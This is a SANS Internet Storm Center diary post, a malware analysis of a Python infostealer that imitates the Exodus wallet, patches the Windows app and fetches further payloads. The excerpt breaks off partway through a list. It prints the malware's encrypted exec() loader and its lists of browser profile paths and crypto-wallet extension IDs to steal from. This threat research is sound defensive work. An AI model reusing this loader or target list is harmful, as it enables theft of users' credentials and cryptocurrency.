---
title: Python Infostealer Patching Windows Exodus App, (Wed, Sep 18th)
url: https://isc.sans.edu/diary/rss/31276
source: SANS Internet Storm Center, InfoCON: green
date: 2024-09-19
fetch_date: 2025-10-06T18:29:35.708824
---

# Python Infostealer Patching Windows Exodus App, (Wed, Sep 18th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31272)
* [next](/diary/31278)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Python Infostealer Patching Windows Exodus App](/forums/diary/Python%2BInfostealer%2BPatching%2BWindows%2BExodus%2BApp/31276/)

**Published**: 2024-09-18. **Last Updated**: 2024-09-18 07:43:00 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Python%2BInfostealer%2BPatching%2BWindows%2BExodus%2BApp/31276/#comments)

A few months ago, I wrote a diary[[1](https://isc.sans.edu/diary/macOS%2BPython%2BScript%2BReplacing%2BWallet%2BApplications%2Bwith%2BRogue%2BApps/30572)] about a Python script that replaced the Exodus[[2](https://www.exodus.com)] Wallet app with a rogue one on macOS. Infostealers are everywhere these days. They target mainly browsers (cookies, credentials) and classic applications that may handle sensitive information. Cryptocurrency wallets are another category of applications that are juicy for attackers. I spotted again an interesting malware that mimics an Exodus wallet by displaying a small GUI:

![](https://isc.sans.edu/diaryimages/images/isc-20240917-1.PNG)

Note: I had to slightly patch the script to make it unable in my lab and there were some encoding glitches.

Besides this, the Python script will also patch the official Windows Exodus app! The file is detected by only 12 antivirus products on VT (SHA256:d7a2d2bcc79674fa28af289a5efa1e399b89333595b22029c53ee4b7a74575e8)[[3](https://www.virustotal.com/gui/file/d7a2d2bcc79674fa28af289a5efa1e399b89333595b22029c53ee4b7a74575e8)]. It uses TK to build the window:

```

class FakeExodusWallet:
    def __init__(self, root):
        self.root = root
        self.root.title("Exodus Wallet - Fake Balance")
        self.cryptos = {
            "BTC": {"balance": 0, "symbol": "?"},
            "ETH": {"balance": 0, "symbol": "Ξ"},
            "LTC": {"balance": 0, "symbol": "?"},
            "DOGE": {"balance": 0, "symbol": "Ð"},
            "ADA": {"balance": 0, "symbol": "?"},
            "DOT": {"balance": 0, "symbol": "?"},
            "XRP": {"balance": 0, "symbol": "?"},
            "BCH": {"balance": 0, "symbol": "?"},
            "LINK": {"balance": 0, "symbol": "?"},
            "BNB": {"balance": 0, "symbol": "?"}
        }
        self.transaction_history = []
        self.create_widgets()
        logging.info("Initialized the FakeExodusWallet application.")

# total gui iit
def create_widgets(self):
    self.notebook = ttk.Notebook(self.root)
    self.notebook.pack(pady=10, expand=True)
    self.balances_frame = ttk.Frame(self.notebook, width=400, height=280)
[...]
```

But the magic is happening at the very beginning of the script:

```

import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests
exec(Fernet(b'RQM6XC1LA3UXTofVJbEGtzGHdHC8617D3uyXnMr48Os=').decrypt(b'gAAAAABm4y_i0oCohYOMNdnNZx5GmZNm_3Z3KUb86T9Du2GQLZcR1HC-d59K11hfFUGoFkyDeydPXCIQhoyM-o4vdlkSiHXKtE4BAlp5E2m0tiFnSHARdTr-xucIsWEO3Hfy0MaKIax6vPleDPTheEsEJBtOPjsJS-ogF-5WcsilggMgjxflfkm4e_xZ0kHlfUhiaoJVnGSX2MgyMHNWnFS3VoHyCh8qUQ=='))
```

This code will fetch the next payload from hxxps://1312services[.]ru/paste?userid=11 and fetch another piece of Python script. This one, once unpacked, will decode another one that will be the real payload: the infostealer. It has classic features to target browsers and extensions:

```

CHROMIUM_BROWSERS = [
    {"name": "Google Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},
    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},
    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},
    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},
]

BROWSER_EXTENSIONS = [
    {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
    {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
    {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
    {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},
    {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
    {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},
    {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},
    {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},
    {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},
    {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},
    {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},
    {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
    {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},
    {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},
    {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},
    {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},
    {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},
    {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},
    {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},
    {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
    {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
    {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
    {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},
    {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},
    {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
    {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
    {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
    {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},
    {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},
    {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},
    {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},
    {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},
    {"nam...